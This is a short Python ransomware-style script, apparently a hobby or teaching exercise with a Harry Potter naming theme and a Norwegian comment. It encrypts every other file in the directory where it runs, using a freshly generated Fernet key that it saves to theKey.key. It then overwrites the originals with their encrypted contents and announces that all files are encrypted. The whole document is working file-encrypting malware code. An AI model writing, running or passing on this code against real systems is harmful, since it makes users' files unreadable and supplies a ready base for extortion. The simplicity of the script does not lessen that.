#! /usr/bin/env python3

import os
from cryptography.fernet import Fernet

#finn filer å kryptere
files = []
for file in os.listdir():
        if file == "voldemort.py" or file == "theKey.key" or file =="harry.py":
                continue
        if os.path.isfile(file):
                files.append(file)

key = Fernet.generate_key()
with open("theKey.key", "wb") as thekey:
        thekey.write(key)

for file in files:
        with open (file, "rb") as thefile:
                contents = thefile.read()
        contetnt_encrypted = Fernet(key).encrypt(contents)
        with open (file, "wb") as thefile:
                thefile.write(contetnt_encrypted)

print("All files in this directory has been encrypted")